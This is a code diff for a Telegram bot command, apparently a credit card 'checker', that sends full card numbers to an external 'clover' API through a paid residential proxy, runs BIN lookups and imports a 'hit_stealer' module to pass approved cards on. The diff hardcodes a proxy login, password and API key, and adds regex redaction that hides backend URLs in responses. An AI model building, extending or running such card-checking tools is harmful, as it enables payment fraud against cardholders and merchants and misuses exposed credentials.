@@ -4,6 +4,7 @@ from pyrogram.enums import ChatType
 import httpx, re, time
 from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
 from plugins.tools.hit_stealer import send_hit_if_approved
+import re
 
 @Client.on_message(filters.command("cl", prefixes=["/", "."]), group=93)
 async def cmd_clover(client, message):
@@ -66,21 +67,21 @@ async def cmd_clover(client, message):
 
         tic = time.perf_counter()
 
-        # Setup async proxy request
         try:
             async with httpx.AsyncClient(timeout=50) as clientx:
-                proxy_string = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
+                proxy_string = "proxy.rampageproxies.com:5000:package-1111111-country-us:5671nuWwEPrHCw2t"
                 url = f"https://barryxapi.xyz/clover?key=BRY-HEIQ7-KPWYR-DRU67&card={fullcc}&proxy={proxy_string}"
                 res = await clientx.get(url)
                 try:
+                    raw_text = res.text
+                    raw_text = re.sub(r'https?://[^\s\'"]+', '[REDACTED_URL]', raw_text)
                     data = res.json()
-                    card_message = data.get("message") or data.get("result") or res.text or "❌ No response message."
+                    card_message = re.sub(r'https?://[^\s\'"]+', '[REDACTED_URL]', data.get("message") or data.get("result") or raw_text or "❌ No response message.")
                 except:
-                    card_message = res.text
+                    card_message = raw_text
         except Exception as e:
             card_message = f"❌ Request failed: {str(e)}"
 
-        # BIN Lookup with proxy (async)
         try:
             headers = {"User-Agent": "Mozilla/5.0"}
             bin_proxy = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
